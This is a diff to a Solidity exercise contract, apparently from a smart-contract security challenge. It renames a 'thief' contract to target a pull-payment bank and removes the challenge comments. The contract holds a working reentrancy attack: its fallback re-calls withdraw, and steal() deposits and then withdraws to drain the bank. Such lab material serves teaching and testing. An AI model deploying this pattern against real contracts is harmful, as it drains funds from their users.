@@ -3,29 +3,23 @@ pragma solidity ^0.8.4;
 
 import "hardhat/console.sol";
 
-import "./EasyBank.sol";
+import "./PullPaymentBank.sol";
 
-contract EasyThief {
+contract PullPaymentThief {
     address thief;
-    EasyBank bank;
+    PullPaymentBank bank;
 
     constructor(address bankAddress) {
         thief = msg.sender;
-        bank = EasyBank(bankAddress);
+        bank = PullPaymentBank(bankAddress);
     }
 
-    //
-    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
-    //
     fallback() external payable {
         if (address(bank).balance >= msg.value) {
             bank.withdraw();
         }
     }
 
-    //
-    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
-    //
     function steal() external payable {
         bank.deposit{value: msg.value}();
         bank.withdraw();
